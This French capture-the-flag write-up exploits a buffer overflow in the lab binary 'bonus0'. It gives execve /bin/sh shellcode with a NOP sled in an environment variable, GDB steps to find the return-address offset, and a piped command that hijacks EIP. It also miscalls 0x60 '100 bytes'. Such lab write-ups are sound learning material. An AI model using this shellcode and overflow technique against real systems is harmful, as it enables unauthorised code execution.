On observe dans notre code les choses suivantes:
La fonction `p` utilise `strncpy` pour copier notre entrée dans un buffer de 20 octets. Si on lui fournit exactement 20 caractères, `strncpy` ne placera pas de caractère de fin de chaîne (`\0`). 
Dans la fonction `pp`, l'utilisation de `strcpy` et `strcat` sur ces buffers non terminés (`first` et `second`) va concaténer la mémoire adjacente, provoquant un Buffer Overflow massif dans le buffer `local_3a` (54 octets) de `main`. 

--> Pour contourner la petite taille des buffers, on place notre shellcode dans une variable d'environnement, précédé d'un "NOP sled" (toboggan de `\x90` de 1000 octets) pour eviter les décalages mémoire entre GDB et l'environnement réel.

```shell
export SHELLCODE=$(python -c 'print "\x90"*1000 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

## Etape 1: Recuperer l'adresse du shellcode

On utilise GDB pour trouver l'adresse exacte de notre variable `SHELLCODE` en mémoire lors de l'exécution :

```shell
gdb ./bonus0
break main
# Breakpoint 1, 0x080485a7 in main ()
run
print (char *)getenv("SHELLCODE")
# On obtient $1 = 0xbffff517
```

--> L'adresse de base est `0xbffff517`. 
L'environnement dans GDB étant légèrement différent de celui du bash pur, nous n'allons pas viser le tout début de l'adresse. Nous ajoutons 100 octets (`0x60`) pour viser le milieu de notre NOP sled.
`0xbffff517 + 0x60` = **`0xbffff577`**
En Little Endian, notre adresse finale est : `\x77\xf5\xff\xbf`

## Etape 2: Trouver le padding

Pour trouver à quel octet exact l'adresse de retour est écrasée, nous envoyons un pattern dans GDB :

```shell
gdb ./bonus0
(gdb) run
 - 
AAAAAAAAAAAAAAAAAAAA
 - 
123456789ABCDEFGHIJKLMNOPQ

Program received signal SIGSEGV, Segmentation fault.
0x44434241 in ?? ()
```
--> GDB nous indique un crash sur l'adresse `0x44434241`. 
Nous avons donc notre padding : **9 octets**.

## Etape 3: Executer

La structure du deuxième input sera : `[9 bytes padding] + [Adresse EIP] + [7 bytes pour atteindre 20]`

```shell
(python -c 'print "A"*20'; sleep 0.5; python -c 'print "B"*9 + "\x77\xf5\xff\xbf" + "C"*7'; cat) | ./bonus0
```

--> On obtient notre flag pour le bonus1 !